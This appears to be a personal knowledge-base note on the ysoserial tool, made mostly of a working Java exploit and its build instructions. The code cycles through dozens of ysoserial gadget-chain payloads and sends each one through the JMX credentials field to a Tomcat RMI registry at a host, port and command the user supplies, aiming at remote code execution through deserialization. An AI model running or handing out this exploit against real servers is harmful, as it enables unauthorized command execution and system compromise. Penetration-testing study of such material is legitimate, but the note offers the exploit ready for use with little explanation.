---
creation date: May 25th 2022
last modified date: May 25th 2022
aliases: []
tags: #📖
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📖  

# [[YSoSerial]]  

### Wrapping ysoserial functionality
This is an example of wrapping ysoserial payload generation in a custom java program targeting Tomcat RMI Registry deserialization vulnerabilities. To compile it, place it in the `ysoserial/src/main/java/ysoserial/Tomcat2016POC.java` file and modify the `ysoserial/pom.xml` file to contain the following edit 
```xml
<!-- snip -->
					<archive>
						<manifest>
							<mainClass>Tomcat2016POC</mainClass>
							<!--<mainClass>ysoserial.GeneratePayload</mainClass>-->
						</manifest>
					</archive>
<!-- snip -->
```

Compile with `mvn clean package -DskipTests` while inside the top level `ysoserial/` directory 

```java
import java.util.HashMap;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import ysoserial.payloads.ObjectPayload;
import java.util.Scanner;

public class Tomcat2016POC {
    public static void main(String[] args) throws Throwable {
        Scanner userInput = new Scanner(System.in);
        String[] payloadTypes = { "AspectJWeaver","BeanShell1","C3P0","Click1","Clojure","CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","CommonsCollections7","FileUpload1","Groovy1","Hibernate1","Hibernate2","JBossInterceptors1","JRMPClient","JRMPListener","JSON1","JavassistWeld1","Jdk7u21","Jython1","MozillaRhino1","MozillaRhino2","Myfaces1","Myfaces2","ROME","Spring1","Spring2","URLDNS","Vaadin1","Wicket1" };
        
        String host = args[0];
        String port = args[1];
        String command = args[2];
        //String[] payloadTypes = { args[3] };
        
        for (String payloadType: payloadTypes) {
            try {
                
                Object payload = new PayloadGenerator(command, payloadType).generateObjectPayload();    

                if (payload == null) {
                    System.err.println("[-] Error creating object payload.Exiting.. ");
                    continue;   
                }    

                HashMap<String, Object> env = new HashMap<>();
                env.put(JMXConnector.CREDENTIALS, payload);

                String url = "service:jmx:rmi:///jndi/rmi://" + host + ":" + port + "/jmxrmi";    // Launch exploit
                JMXConnectorFactory.connect(new JMXServiceURL(url), env);
            } catch (Exception ex) {
                ex.printStackTrace();
            }

            System.out.print("Finished attempt for " + payloadType + ", press enter to continue...");
            userInput.nextLine();
        }
    }

    /**
    * Wrapper around ysoserial ObjectPayload class for ease of use.
    */
    private static final class PayloadGenerator {
        private String command;
        private String payloadType = "Groovy1";
        
        PayloadGenerator(String command, String payloadType) {
            this.command = command;
            this.payloadType = payloadType;
        }
        
        Object generateObjectPayload() {
            Class<? extends ObjectPayload> payloadClass =
                ObjectPayload.Utils.getPayloadClass(payloadType);        
            
            if (payloadClass == null) {
                System.err.println("[-] Invalid payload type '" + payloadType + "'");
                return null;
            }        

            try {
                ObjectPayload payload = payloadClass.newInstance();
                
                return payload.getObject(command);
            } catch (Throwable t) {
                // do nothing, returning null anyway.
            }

            return null;
        }  
    }

}
```



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: May 25th 2022 (08:07 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
